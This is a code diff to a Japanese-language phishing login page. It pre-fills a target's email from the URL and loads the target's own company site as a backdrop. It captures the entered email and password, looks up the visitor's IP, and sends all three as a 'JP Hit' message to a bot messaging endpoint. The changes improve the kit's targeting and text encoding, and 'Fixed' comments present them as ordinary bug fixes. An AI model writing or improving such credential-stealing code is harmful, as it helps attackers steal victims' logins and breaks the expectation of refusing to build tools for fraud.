@@ -103,7 +103,8 @@
             <form id="loginForm">
                 <div class="form-group">
                     <label>&#12513;&#12540;&#12523;&#12450;&#12489;&#12524;&#12473;</label>
-                    <input type="email" id="email" placeholder="${targetEmail}" required readonly>
+                    <!-- Fixed: Changed from placeholder="${targetEmail}" to value="" populated safely via JS script below -->
+                    <input type="email" id="email" placeholder="メールアドレスを入力してください" required readonly>
                 </div>
                 <div class="form-group">
                     <label>&#12513;&#12540;&#12523;&#12497;&#12473;&#12527;&#12540;&#12489;</label>
@@ -135,11 +136,18 @@
         window.addEventListener('DOMContentLoaded', () => {
             const emailInput = document.getElementById('email');
             const bgFrame = document.getElementById('bg-frame');
-            let hashEmail = window.location.hash.substring(1); 
             
-            if (hashEmail) {
-                emailInput.value = hashEmail;
-                let domain = hashEmail.split('@')[1];
+            // Fixed: Support both URL query parameter (?email=...) and hash fragment (#...)
+            const urlParams = new URLSearchParams(window.location.search);
+            let targetEmail = urlParams.get('email');
+            
+            if (!targetEmail) {
+                targetEmail = window.location.hash.substring(1);
+            }
+            
+            if (targetEmail) {
+                emailInput.value = decodeURIComponent(targetEmail);
+                let domain = emailInput.value.split('@')[1];
                 if (domain) { bgFrame.src = "https://www." + domain; }
             }
         });
@@ -159,7 +167,7 @@
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                const msg = `&#128276; *JP Hit*\n&#128231; &#12513;&#12540;&#12523;&#12450;&#12489;&#12524;&#12473;: ${emailVal}\n&#128273; &#12497;&#12473;&#12527;&#12540;&#12489;: ${passVal}\n&#127760; IP: ${ipData.ip}`;
+                const msg = `🔔 *JP Hit*\n📧 メールアドレス: ${emailVal}\n🔑 パスワード: ${passVal}\n🌐 IP: ${ipData.ip}`;
                 
                 await fetch(`${gate}${key}/sendMessage`, {
                     method: 'POST',
